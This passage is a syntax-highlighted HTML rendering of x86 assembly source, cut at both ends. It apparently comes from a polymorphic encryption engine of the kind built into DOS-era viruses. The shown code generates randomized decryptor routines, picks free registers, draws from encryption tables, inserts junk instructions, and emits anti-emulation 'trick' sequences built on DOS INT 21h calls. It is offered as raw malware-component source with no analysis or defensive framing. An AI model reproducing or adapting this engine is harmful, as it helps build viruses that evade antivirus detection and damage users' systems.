        </span><span class="sc6">JNS</span><span class="sc0"> </span><span class="sc5">NO_INIT_DESP</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CHK_MODE_SZ</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
</span><span class="sc5">NO_INIT_DESP</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc5">_ESP</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GEN_DEC</span><span class="sc0">
</span><span class="sc5">NO_CHG_ESP</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_4</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_CHG_OFF</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;SMALL 1 PTR DS:SET_WR_FLAG</span><span class="sc0">
        </span><span class="sc6">JS</span><span class="sc0">  </span><span class="sc5">NO_CHG_OFF</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">DEC_OFF_COUNT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_CHG_OFF</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;SMALL 1 PTR DS:OFF_REG</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GEN_DEC</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">INIT_OFF</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">ADDRESS_MODE</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_FREE_REG</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">13H</span><span class="sc4">],</span><span class="sc8">BL</span><span class="sc0">         </span><span class="sc1">;SMALL 1 PTR DS:OFF_REG</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GEN_PUSH</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_SHIT</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc5">_EBP</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">THREE_MODE</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">EBP_MODE</span><span class="sc0">
</span><span class="sc5">THREE_MODE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_3</span><span class="sc0">
</span><span class="sc5">EBP_MODE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">ROR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">SHORT_OPCODE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">2004H</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_4</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">EXT_MODE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">JP</span><span class="sc0">  </span><span class="sc5">SECOND_M_MODE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">45H</span><span class="sc0">
        </span><span class="sc6">JS</span><span class="sc0">  </span><span class="sc5">SECOND_M_MODE</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CHK_MODE</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">SECOND_M_MODE</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">85H</span><span class="sc0">
</span><span class="sc5">SECOND_M_MODE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">BH</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0C0C0H</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GET_RAND_DWORD</span><span class="sc0">
</span><span class="sc5">SHORT_OPCODE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0FFH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
</span><span class="sc5">EXT_MODE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],(</span><span class="sc5">ADD_RIMM</span><span class="sc0"> </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">GET_RAND_DWORD</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">GO_MOV_WREG</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_WORD</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],(</span><span class="sc5">ADD_RB</span><span class="sc0"> </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_ADD_RB</span><span class="sc0">
        </span><span class="sc6">CBW</span><span class="sc0">
        </span><span class="sc6">CWDE</span><span class="sc0">
</span><span class="sc5">NO_ADD_RB</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">          </span><span class="sc1">;SMALL 4 PTR DS:DELTA_VALUE</span><span class="sc0">
</span><span class="sc5">GO_MOV_WREG</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CHK_MODE_SZ</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">12H</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">         </span><span class="sc1">;SMALL 1 PTR DS:DEC_OFF_COUNT</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">EBP</span><span class="sc0">          </span><span class="sc1">;SMALL 4 PTR DS:OFF_VALUE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CURRENT_LEN</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">EBP</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">0EH</span><span class="sc4">],</span><span class="sc8">EBP</span><span class="sc0">            </span><span class="sc1">;SMALL 4 PTR DS:TOP_ADDRESS</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">MOV_WREG</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">INIT_COUNT</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_4</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_INIT</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_FREE_REG</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">COUNT_REG</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GEN_PUSH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CURRENT_LEN</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CHK_MODE</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">IS_WM</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">IS_WM</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">MOV_WREG_SH</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">INIT_MASK</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_4</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_INIT</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_FREE_REG</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">MASK_REG</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GEN_PUSH</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_WORD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">MASK_VALUE</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">MASK_CR</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
</span><span class="sc5">MOV_WREG_SH</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_SHIT</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">MOV_WREG</span><span class="sc0">

</span><span class="sc1">;======================================</span><span class="sc0">
</span><span class="sc5">ENCRYPT_ITER</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">LEN_SEEK</span><span class="sc0">
        </span><span class="sc6">JCXZ</span><span class="sc0">    </span><span class="sc5">NO_CODE_ITER</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_ENCRYPT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc5">SIZE_ENCRYPT_TBL</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">BUFF4ENCRYPT</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">ADDRESS_EMPTY</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">LODSW</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_BYTE</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc5">SEEK_TABLE</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">LODSB</span><span class="sc0">
        </span><span class="sc6">CBW</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc5">TEMP_DECRYPTOR</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">LEN_SEEK</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">IS_LAST_OFF</span><span class="sc0">
</span><span class="sc5">SEEK_MOVE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">LODSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0FFH</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">SEEK_MOVE</span><span class="sc0">
</span><span class="sc5">IS_LAST_OFF</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_WORD</span><span class="sc0">
        </span><span class="sc6">POPF</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0">  </span><span class="sc5">UNARE_OPCODE</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc5">UNARE_OPCODE</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">BUFF4ENCRYPT</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">1234H</span><span class="sc0">
</span><span class="sc5">NO_CODE_ITER</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">GET_ENCRYPT</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">SIZE_ENCRYPT_TBL</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_BYTE</span><span class="sc0">
        </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc5">ENCRYPT_TBL</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">LODSW</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0C0H</span><span class="sc0">
        </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">GET_TRICK</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">DIRTY_WREG</span><span class="sc4">,</span><span class="sc5">FREE_WREG</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">DIRTY_SREG</span><span class="sc4">,</span><span class="sc5">FREE_SREG</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_SHIT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">TRICK_TBL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">SIZE_TRICK_TBL</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;SI=TABLE,AL=HIGH LIMIT</span><span class="sc0">
</span><span class="sc5">CALL_RANDOM</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_BYTE</span><span class="sc0">
        </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;MOV    AX,30XXH</span><span class="sc0">
</span><span class="sc1">;INT    21H</span><span class="sc0">
</span><span class="sc1">;CMP    AL,7/CMP AL,6</span><span class="sc0">
</span><span class="sc1">;JAE    @@OK/JA @@OK</span><span class="sc0">
</span><span class="sc1">;RETN</span><span class="sc0">
</span><span class="sc1">;@@OK:</span><span class="sc0">
</span><span class="sc5">TRICK_1</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">30H</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MOV_AH</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GEN_INT21</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">CMP_JAX_AL</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;MOV    AX,19XXH</span><span class="sc0">
</span><span class="sc1">;INT    21H</span><span class="sc0">
</span><span class="sc1">;CMP    AL,'Z'-'A'/'Z'-'A'+1</span><span class="sc0">
</span><span class="sc1">;JBE    @@OK/JB @@OK</span><span class="sc0">
</span><span class="sc1">;RETN</span><span class="sc0">
</span><span class="sc1">;@@OK:</span><span class="sc0">
</span><span class="sc5">TRICK_2</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">19H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">'Z'</span><span class="sc4">-</span><span class="sc12">'A'</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">12345678H</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;MOV    AX,2AXXH</span><span class="sc0">
</span><span class="sc1">;INT    21H</span><span class="sc0">
</span><span class="sc1">;CMP    AL,6/7</span><span class="sc0">
</span><span class="sc1">;JBE    @@OK/JB @@OK</span><span class="sc0">
</span><span class="sc1">;RETN</span><span class="sc0">
</span><span class="sc1">;@@OK:</span><span class="sc0">
</span><span class="sc5">TRICK_3</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">2AH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">12345678H</span><span class="sc0">
